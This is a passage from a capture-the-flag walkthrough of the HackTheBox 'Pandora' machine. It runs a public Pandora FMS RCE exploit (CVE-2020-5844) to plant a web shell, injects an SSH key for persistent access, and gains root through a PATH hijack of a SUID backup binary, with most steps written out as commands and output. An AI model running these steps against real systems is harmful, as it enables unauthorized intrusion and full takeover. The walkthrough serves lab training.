![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726170336.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726170345.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726170358.png)

We're in!!

**Then, by combining the file upload vulnerability, we can gain RCE (Remote Code Execution) on the target machine as user `matt`!**

- Copy the `PHPSESSID` cookie:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726170534.png)

- Run the exploit with the cookie:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|17:05:56(HKT)]
└> python3 50961.py -t 127.0.0.1 8001 -p o25pi5kalchigid7vdaigtfvun

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution
OPTIONS: Web Shell Mode
PHPSESS: o25pi5kalchigid7vdaigtfvun
WEBFILE: unicord.php
WEBSITE: http://127.0.0.1:8001/pandora_console
EXPLOIT: Connected to website! Status Code: 200
EXPLOIT: Logged into Pandora FMS!
EXPLOIT: Web shell uploaded!
SUCCESS: Web shell available at: http://127.0.0.1:8001/pandora_console/images/unicord.php?cmd=whoami 

┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|17:06:14(HKT)]
└> curl http://127.0.0.1:8001/pandora_console/images/unicord.php --get --data-urlencode "cmd=id"
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```

**Nice! Let's get a shell by inserting our own public SSH key:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|17:09:17(HKT)]
└> curl http://127.0.0.1:8001/pandora_console/images/unicord.php --get --data-urlencode "cmd=mkdir /home/matt/.ssh"
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|17:10:09(HKT)]
└> ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/siunam/.ssh/id_rsa): /home/siunam/ctf/htb/Machines/Pandora/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/siunam/ctf/htb/Machines/Pandora/id_rsa
Your public key has been saved in /home/siunam/ctf/htb/Machines/Pandora/id_rsa.pub
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|17:10:45(HKT)]
└> cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0nwEwlHs3D1JGVg/w9+Y9ZyqRPYKpIeFKHsMU32v8B4g+jTgqeg2PIrvbQxauUq0c67fbkW98VlgZBHvgIMbpmlGptZ4av+c8DThLpmPc/wJPcv/6Ivo/OSwvDCOEgQ6TkkhRzzOT7NylPskjKFhA8HVY7LFndkpt+FxBOj1PS6MVdOJHPsJetWuxEe1Mja66lgefrBi22GFT7vH6fz26u1ERWWu2xpqyEopg+DGynF6qQYrPKqySSPV0o3crzHOfkI9ksmb0UqAsKJTCPnTz4hjcQa/D5cvCHmDawI8uapgsrgkuZ1lQQZuBMPxN8xnssstpPBPPPtkX7PcMR9bGeMuKPgoKzq7Is3Ymej29Fu/UoIRigJmEaSorUiBR8g+2dlT9ZBc002Qo6IJn9OlX0ZocIxUbJ3swpp6d0kvBlyheXeFmo+shHq5v9v67neCmZBw4yXgHqMYEea3mfluykYsCL2yYQhShWX6cesMgaSnCV7jfKUnfXpJxfjYX3Sk= siunam@Mercury
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|17:11:17(HKT)]
└> curl http://127.0.0.1:8001/pandora_console/images/unicord.php --get --data-urlencode "cmd=echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0nwEwlHs3D1JGVg/w9+Y9ZyqRPYKpIeFKHsMU32v8B4g+jTgqeg2PIrvbQxauUq0c67fbkW98VlgZBHvgIMbpmlGptZ4av+c8DThLpmPc/wJPcv/6Ivo/OSwvDCOEgQ6TkkhRzzOT7NylPskjKFhA8HVY7LFndkpt+FxBOj1PS6MVdOJHPsJetWuxEe1Mja66lgefrBi22GFT7vH6fz26u1ERWWu2xpqyEopg+DGynF6qQYrPKqySSPV0o3crzHOfkI9ksmb0UqAsKJTCPnTz4hjcQa/D5cvCHmDawI8uapgsrgkuZ1lQQZuBMPxN8xnssstpPBPPPtkX7PcMR9bGeMuKPgoKzq7Is3Ymej29Fu/UoIRigJmEaSorUiBR8g+2dlT9ZBc002Qo6IJn9OlX0ZocIxUbJ3swpp6d0kvBlyheXeFmo+shHq5v9v67neCmZBw4yXgHqMYEea3mfluykYsCL2yYQhShWX6cesMgaSnCV7jfKUnfXpJxfjYX3Sk= siunam@Mercury' > /home/matt/.ssh/authorized_keys"
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|17:11:32(HKT)]
└> ssh -i id_rsa matt@$RHOSTS
[...]
matt@pandora:~$ whoami; id; hostname; ip a
matt
uid=1000(matt) gid=1000(matt) groups=1000(matt)
pandora
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:13:64 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.136/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:1364/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:feb9:1364/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `matt`!

**user.txt:**
```shell
matt@pandora:~$ cat /home/matt/user.txt 
{Redacted}
```

### matt to root

**During the enumerations process in user `daniel`, we found that there's a weird, non-default SUID binary:**
```shell
matt@pandora:~$ file /usr/bin/pandora_backup 
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
matt@pandora:~$ ls -lah /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 17K Dec  3  2021 /usr/bin/pandora_backup
```

When this binary is running, it'll executed as the created user, which is `root`.

**We can try to run it:**
```shell
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: Removing leading `/' from member names
/var/www/pandora/pandora_console/AUTHORS
tar: Removing leading `/' from hard link targets
/var/www/pandora/pandora_console/COPYING
[...]
/var/www/pandora/pandora_console/ws.php
Backup successful!
Terminating program!
```

In the above message, we can see **it's using `tar` binary to compress and backup** the entire Pandora FMS webroot directory.

**But, let's transfer it and use `strings` to try to view what command is it using:**
```shell
matt@pandora:~$ python3 -m http.server -d /usr/bin/ 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|17:17:39(HKT)]
└> wget http://$RHOSTS:9001/pandora_backup
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|17:18:09(HKT)]
└> strings pandora_backup 
[...]
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
[...]
```

As you can see, it's using `tar` with option `-cvf` to compress the Pandora FMS webroot directory to `/root/.backup/pandora-backup.tar.gz`.

**However, the `tar` command is not using absolute path, which means we can exploit the `PATH` environment variable injection vulnerability to escalate our privilege to `root`!**

To do so, we can:

- Export our `PATH` environment variable to `/tmp`:

```shell
matt@pandora:~$ export PATH=/tmp:$PATH
matt@pandora:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

- Create a malicious Bash script called `tar` in `/tmp`, so that it can escalate our privilege to `root`:

```shell
matt@pandora:~$ cat << EOF > /tmp/tar
> #!/bin/bash
> cp /bin/bash /tmp/root_bash
> chmod +s /tmp/root_bash
> EOF
matt@pandora:~$ chmod +x /tmp/tar
```

This Bash script will copy `/bin/bash` to `/tmp`, and add SUID sticky bit to the `/tmp` one. The `/tmp/root_bash` can then spawn a root Bash shell.

- Run the vulnerable SUID binary:

```shell
matt@pandora:~$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup successful!
Terminating program!
```

- Verify if it worked:

```shell
matt@pandora:~$ ls -lah /tmp/root_bash 
-rwsr-sr-x 1 root matt 1.2M Jul 26 09:41 /tmp/root_bash
```

**Nice! It worked! Let's spawn a root Bash shell!**
```shell
matt@pandora:~$ /tmp/root_bash -p
root_bash-5.0# whoami; id; hostname; ip a
root
uid=1000(matt) gid=1000(matt) euid=0(root) groups=1000(matt)
pandora
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:13:64 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.136/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:1364/64 scope global dynamic mngtmpaddr 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb9:1364/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```shell
root_bash-5.0# cat /root/root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726174223.png)

## Conclusion

What we've learned:

1. Enumerating SNMP
2. Port Forwarding With `chisel`
3. Exploiting Pandora FMS v7.0 NG 742's SQL Injection & RCE
4. Vertical Privilege Escalation Via Exploiting `PATH` Variable Injection